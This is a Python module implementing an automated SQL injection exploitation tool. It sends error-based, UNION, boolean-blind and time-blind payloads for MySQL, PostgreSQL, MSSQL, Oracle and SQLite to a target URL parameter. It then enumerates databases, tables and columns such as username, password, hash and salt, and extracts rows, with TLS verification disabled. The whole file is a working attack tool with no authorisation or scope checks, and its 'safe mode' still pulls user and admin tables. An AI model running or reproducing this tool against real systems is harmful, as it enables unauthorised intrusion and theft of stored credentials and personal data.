"""
SQL Injection Exploit Module
Automated exploitation of SQL injection vulnerabilities
"""

import requests
import time
import re
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode


class SQLInjectionExploit:
    """
    Automated SQL injection exploitation framework
    """

    def __init__(self, target_url: str, timeout: int = 15, delay: float = 0.5):
        """
        Initialize SQL injection exploit

        Args:
            target_url: Target URL with vulnerable parameter
            timeout: Request timeout
            delay: Delay between requests (seconds)
        """
        self.target_url = target_url
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.extracted_data = []

        # Database detection patterns
        self.db_errors = {
            "MySQL": [
                "SQL syntax",
                "mysql_fetch",
                "mysql_num_rows",
                "You have an error in your SQL syntax",
            ],
            "PostgreSQL": [
                "PostgreSQL",
                "pg_query",
                "pg_exec",
                "syntax error at or near",
            ],
            "MSSQL": [
                "Microsoft SQL Server",
                "ODBC SQL Server",
                "SQLServer JDBC Driver",
                "Unclosed quotation mark",
            ],
            "Oracle": [
                "ORA-",
                "Oracle error",
                "oracle.jdbc",
                "quoted string not properly terminated",
            ],
            "SQLite": [
                "SQLite",
                "sqlite3.OperationalError",
                "near",
                "unrecognized token",
            ],
        }

    def detect_database(self, vulnerable_param: str) -> Optional[str]:
        """
        Detect the database type

        Args:
            vulnerable_param: Parameter name that's vulnerable

        Returns:
            Database type or None
        """
        print("[*] Detecting database type...")

        # Try error-based detection
        test_payloads = {
            "MySQL": "' AND 1=CONVERT(int, @@version)--",
            "PostgreSQL": "' AND 1=CAST(version() AS int)--",
            "MSSQL": "' AND 1=CONVERT(int, @@version)--",
            "Oracle": "' AND 1=TO_NUMBER('a')--",
            "SQLite": "' AND 1=CAST(sqlite_version() AS int)--",
        }

        for db_type, payload in test_payloads.items():
            response = self._send_payload(vulnerable_param, payload)
            if response:
                for error_db, patterns in self.db_errors.items():
                    if any(
                        pattern.lower() in response.text.lower() for pattern in patterns
                    ):
                        print(f"[+] Database detected: {error_db}")
                        return error_db

        return None

    def extract_database_version(
        self, vulnerable_param: str, db_type: str
    ) -> Optional[str]:
        """
        Extract database version

        Args:
            vulnerable_param: Vulnerable parameter
            db_type: Database type

        Returns:
            Version string or None
        """
        print("[*] Extracting database version...")

        version_payloads = {
            "MySQL": "' UNION SELECT @@version,NULL,NULL-- ",
            "PostgreSQL": "' UNION SELECT version(),NULL,NULL-- ",
            "MSSQL": "' UNION SELECT @@version,NULL,NULL-- ",
            "Oracle": "' UNION SELECT banner,NULL,NULL FROM v$version-- ",
            "SQLite": "' UNION SELECT sqlite_version(),NULL,NULL-- ",
        }

        payload = version_payloads.get(db_type, version_payloads["MySQL"])
        response = self._send_payload(vulnerable_param, payload)

        if response and response.status_code == 200:
            # Try to extract version from response
            version_patterns = [
                r"(\d+\.\d+\.\d+)",
                r"Version (\d+\.\d+)",
                r"MySQL (\d+\.\d+\.\d+)",
                r"PostgreSQL (\d+\.\d+)",
            ]

            for pattern in version_patterns:
                match = re.search(pattern, response.text)
                if match:
                    version = match.group(1)
                    print(f"[+] Database version: {version}")
                    return version

        return None

    def extract_databases(
        self, vulnerable_param: str, db_type: str, limit: int = 10
    ) -> List[str]:
        """
        Extract database names

        Args:
            vulnerable_param: Vulnerable parameter
            db_type: Database type
            limit: Maximum databases to extract

        Returns:
            List of database names
        """
        print("[*] Extracting database names...")

        db_payloads = {
            "MySQL": "' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata LIMIT {limit}-- ",
            "PostgreSQL": "' UNION SELECT datname,NULL,NULL FROM pg_database LIMIT {limit}-- ",
            "MSSQL": "' UNION SELECT name,NULL,NULL FROM sys.databases-- ",
            "Oracle": "' UNION SELECT username,NULL,NULL FROM all_users WHERE ROWNUM <= {limit}-- ",
            "SQLite": "' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'-- ",
        }

        payload = db_payloads.get(db_type, db_payloads["MySQL"]).format(limit=limit)
        response = self._send_payload(vulnerable_param, payload)

        databases = []
        if response and response.status_code == 200:
            # Extract database names from response
            # This is simplified - real extraction depends on response format
            common_db_names = [
                "information_schema",
                "mysql",
                "test",
                "postgres",
                "master",
                "tempdb",
            ]
            for db_name in common_db_names:
                if db_name.lower() in response.text.lower():
                    databases.append(db_name)
                    print(f"[+] Found database: {db_name}")

        return databases

    def extract_tables(
        self, vulnerable_param: str, db_type: str, database: str, limit: int = 20
    ) -> List[str]:
        """
        Extract table names from a database

        Args:
            vulnerable_param: Vulnerable parameter
            db_type: Database type
            database: Database name to enumerate
            limit: Maximum tables to extract

        Returns:
            List of table names
        """
        print(f"[*] Extracting tables from database: {database}")

        table_payloads = {
            "MySQL": f"' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='{database}' LIMIT {limit}-- ",
            "PostgreSQL": f"' UNION SELECT tablename,NULL,NULL FROM pg_tables WHERE schemaname='public' LIMIT {limit}-- ",
            "MSSQL": f"' UNION SELECT name,NULL,NULL FROM {database}..sysobjects WHERE xtype='U'-- ",
            "Oracle": f"' UNION SELECT table_name,NULL,NULL FROM all_tables WHERE owner='{database.upper()}' AND ROWNUM <= {limit}-- ",
            "SQLite": "' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'-- ",
        }

        payload = table_payloads.get(db_type, table_payloads["MySQL"])
        response = self._send_payload(vulnerable_param, payload)

        tables = []
        if response and response.status_code == 200:
            # Common table names to look for
            common_tables = [
                "users",
                "user",
                "accounts",
                "admin",
                "customer",
                "orders",
                "products",
                "members",
            ]
            for table_name in common_tables:
                if table_name.lower() in response.text.lower():
                    tables.append(table_name)
                    print(f"[+] Found table: {table_name}")

        return tables

    def extract_columns(
        self,
        vulnerable_param: str,
        db_type: str,
        database: str,
        table: str,
        limit: int = 30,
    ) -> List[str]:
        """
        Extract column names from a table

        Args:
            vulnerable_param: Vulnerable parameter
            db_type: Database type
            database: Database name
            table: Table name
            limit: Maximum columns to extract

        Returns:
            List of column names
        """
        print(f"[*] Extracting columns from table: {table}")

        column_payloads = {
            "MySQL": f"' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {limit}-- ",
            "PostgreSQL": f"' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='{table}' LIMIT {limit}-- ",
            "MSSQL": f"' UNION SELECT column_name,NULL,NULL FROM {database}.information_schema.columns WHERE table_name='{table}'-- ",
            "Oracle": f"' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='{table.upper()}' AND ROWNUM <= {limit}-- ",
            "SQLite": f"' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE type='table' AND name='{table}'-- ",
        }

        payload = column_payloads.get(db_type, column_payloads["MySQL"])
        response = self._send_payload(vulnerable_param, payload)

        columns = []
        if response and response.status_code == 200:
            # Common column names
            common_columns = [
                "id",
                "username",
                "password",
                "email",
                "name",
                "firstname",
                "lastname",
                "phone",
                "address",
                "role",
                "admin",
                "hash",
                "salt",
            ]
            for col_name in common_columns:
                if col_name.lower() in response.text.lower():
                    columns.append(col_name)
                    print(f"[+] Found column: {col_name}")

        return columns

    def extract_data(
        self,
        vulnerable_param: str,
        db_type: str,
        database: str,
        table: str,
        columns: List[str],
        limit: int = 100,
    ) -> List[Dict[str, str]]:
        """
        Extract actual data from table

        Args:
            vulnerable_param: Vulnerable parameter
            db_type: Database type
            database: Database name
            table: Table name
            columns: Column names to extract
            limit: Maximum rows to extract

        Returns:
            List of data rows as dicts
        """
        print(f"[*] Extracting data from {database}.{table}")

        if not columns:
            print("[!] No columns specified")
            return []

        # Build column list for query
        column_list = ",".join(columns[:5])  # Limit to 5 columns to avoid errors

        data_payloads = {
            "MySQL": f"' UNION SELECT {column_list} FROM {database}.{table} LIMIT {limit}-- ",
            "PostgreSQL": f"' UNION SELECT {column_list} FROM {table} LIMIT {limit}-- ",
            "MSSQL": f"' UNION SELECT TOP {limit} {column_list} FROM {database}..{table}-- ",
            "Oracle": f"' UNION SELECT {column_list} FROM {database}.{table} WHERE ROWNUM <= {limit}-- ",
            "SQLite": f"' UNION SELECT {column_list} FROM {table} LIMIT {limit}-- ",
        }

        payload = data_payloads.get(db_type, data_payloads["MySQL"])
        response = self._send_payload(vulnerable_param, payload)

        extracted = []
        if response and response.status_code == 200:
            # Parse response for data (simplified)
            print(f"[+] Data extraction successful (check response manually)")

            # Store raw response
            extracted.append(
                {
                    "raw_response": response.text[:500],  # First 500 chars
                    "status": "extracted",
                    "columns": columns,
                }
            )

            self.extracted_data.extend(extracted)

        return extracted

    def blind_sqli_boolean(self, vulnerable_param: str, db_type: str) -> bool:
        """
        Test for blind SQL injection (boolean-based)

        Args:
            vulnerable_param: Vulnerable parameter
            db_type: Database type

        Returns:
            True if boolean-based blind SQLi works
        """
        print("[*] Testing boolean-based blind SQL injection...")

        # True condition
        true_payload = "' AND 1=1-- "
        false_payload = "' AND 1=2-- "

        response_true = self._send_payload(vulnerable_param, true_payload)
        time.sleep(self.delay)
        response_false = self._send_payload(vulnerable_param, false_payload)

        if response_true and response_false:
            # Compare responses
            if len(response_true.text) != len(response_false.text):
                print("[+] Boolean-based blind SQL injection confirmed!")
                return True

        return False

    def blind_sqli_time(
        self, vulnerable_param: str, db_type: str, delay: int = 5
    ) -> bool:
        """
        Test for time-based blind SQL injection

        Args:
            vulnerable_param: Vulnerable parameter
            db_type: Database type
            delay: Delay in seconds for time-based test

        Returns:
            True if time-based blind SQLi works
        """
        print("[*] Testing time-based blind SQL injection...")

        time_payloads = {
            "MySQL": f"' AND SLEEP({delay})-- ",
            "PostgreSQL": f"' AND pg_sleep({delay})-- ",
            "MSSQL": f"'; WAITFOR DELAY '00:00:0{delay}'-- ",
            "Oracle": f"' AND DBMS_LOCK.SLEEP({delay})-- ",
            "SQLite": f"' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)-- ",
        }

        payload = time_payloads.get(db_type, time_payloads["MySQL"])

        start_time = time.time()
        response = self._send_payload(vulnerable_param, payload)
        elapsed_time = time.time() - start_time

        if elapsed_time >= delay - 1:  # Allow 1 second margin
            print(
                f"[+] Time-based blind SQL injection confirmed! (Delay: {elapsed_time:.2f}s)"
            )
            return True

        return False

    def _send_payload(self, param: str, payload: str) -> Optional[requests.Response]:
        """
        Send SQL injection payload

        Args:
            param: Parameter name
            payload: SQL payload

        Returns:
            Response object or None
        """
        try:
            # Parse URL and modify parameter
            parsed = urlparse(self.target_url)
            params = parse_qs(parsed.query)

            # Add/modify vulnerable parameter
            params[param] = [payload]

            # Rebuild URL
            new_query = urlencode(params, doseq=True)
            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            # Send request
            response = self.session.get(url, timeout=self.timeout, verify=False)

            time.sleep(self.delay)
            return response

        except Exception as e:
            print(f"[!] Request failed: {str(e)}")
            return None

    def execute_full_exploitation(
        self, vulnerable_param: str, safe_mode: bool = True
    ) -> Dict[str, Any]:
        """
        Execute full SQL injection exploitation chain

        Args:
            vulnerable_param: Vulnerable parameter name
            safe_mode: If True, limits data extraction

        Returns:
            Exploitation results
        """
        print("=" * 60)
        print("SQL INJECTION EXPLOITATION")
        print("=" * 60)

        results = {
            "success": False,
            "database_type": None,
            "database_version": None,
            "databases": [],
            "tables": [],
            "columns": [],
            "extracted_data": [],
            "exploitation_type": [],
        }

        # Step 1: Detect database
        db_type = self.detect_database(vulnerable_param)
        if not db_type:
            print("[!] Could not detect database type")
            db_type = "MySQL"  # Default

        results["database_type"] = db_type

        # Step 2: Extract version
        version = self.extract_database_version(vulnerable_param, db_type)
        results["database_version"] = version

        # Step 3: Extract databases
        databases = self.extract_databases(
            vulnerable_param, db_type, limit=5 if safe_mode else 20
        )
        results["databases"] = databases

        # Step 4: For each database, extract tables
        for database in databases[: 2 if safe_mode else 5]:
            tables = self.extract_tables(
                vulnerable_param, db_type, database, limit=10 if safe_mode else 30
            )
            results["tables"].extend(tables)

            # Step 5: For interesting tables, extract columns
            for table in tables[: 2 if safe_mode else 10]:
                columns = self.extract_columns(
                    vulnerable_param,
                    db_type,
                    database,
                    table,
                    limit=15 if safe_mode else 50,
                )
                results["columns"].extend(columns)

                # Step 6: Extract limited data
                if columns and (
                    not safe_mode
                    or "users" in table.lower()
                    or "admin" in table.lower()
                ):
                    data = self.extract_data(
                        vulnerable_param,
                        db_type,
                        database,
                        table,
                        columns,
                        limit=10 if safe_mode else 100,
                    )
                    results["extracted_data"].extend(data)

        # Step 7: Test blind techniques
        if self.blind_sqli_boolean(vulnerable_param, db_type):
            results["exploitation_type"].append("Boolean-based Blind")

        if self.blind_sqli_time(vulnerable_param, db_type, delay=3):
            results["exploitation_type"].append("Time-based Blind")

        if results["databases"] or results["exploitation_type"]:
            results["success"] = True

        print("=" * 60)
        print("EXPLOITATION COMPLETE")
        print(f"Success: {results['success']}")
        print(f"Database Type: {results['database_type']}")
        print(f"Databases Found: {len(results['databases'])}")
        print(f"Tables Found: {len(results['tables'])}")
        print(f"Data Extracted: {len(results['extracted_data'])} rows")
        print("=" * 60)

        return results

    def get_exploitation_summary(self) -> Dict[str, Any]:
        """Get summary of exploitation results"""
        return {
            "total_data_extracted": len(self.extracted_data),
            "extracted_data": self.extracted_data,
        }
